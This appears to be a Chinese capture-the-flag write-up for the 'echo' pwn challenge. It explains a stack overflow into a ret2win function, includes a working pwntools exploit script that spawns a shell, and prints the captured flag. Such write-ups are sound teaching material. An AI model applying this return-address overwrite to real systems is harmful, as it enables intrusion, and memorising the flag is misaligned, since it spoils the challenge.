# echo

## 题目简述

程序在循环中把最多 `0x80` 字节读入仅 80 字节的栈缓冲区 `message`。二进制还包含未从正常流程调用的 `win()`，其内部执行 `system("/bin/sh")`。覆盖返回地址后，再让循环正常退出即可跳入 `win`。

## 解题过程

缓冲区到返回地址的距离为 $80+8=88$ 字节：前 80 字节覆盖 `message`，再越过 8 字节保存的 `rbp`。官方脚本将返回地址设置为 `win + 5`；这个入口避开函数序言并满足该二进制的调用栈布局：

```python
from pwn import *

p = process("dist/echo.bin")
elf = ELF("dist/echo.bin")

payload = flat({88: p64(elf.symbols["win"] + 5)})
p.sendlineafter(b"> ", payload)
p.sendlineafter(b"> ", b"q")
p.interactive()
```

第一次输入只覆盖栈，程序仍在循环内；第二次发送 `q` 使 `main` 执行 `return`，此时才取出被覆盖的返回地址并进入 Shell。读取 Flag 得到：

```text
greyhats{ech0_aft3r_m3_aH_jkplsno_455a214}
```

## 方法总结

这是标准 ret2win，但触发时机容易忽略：漏洞发生在循环内，必须再走到函数返回点。偏移应由实际栈帧确认；目标地址是否使用函数入口或跳过序言，则要结合指令、栈对齐和官方二进制验证，不能把固定的 `+5` 当成可移植规则。
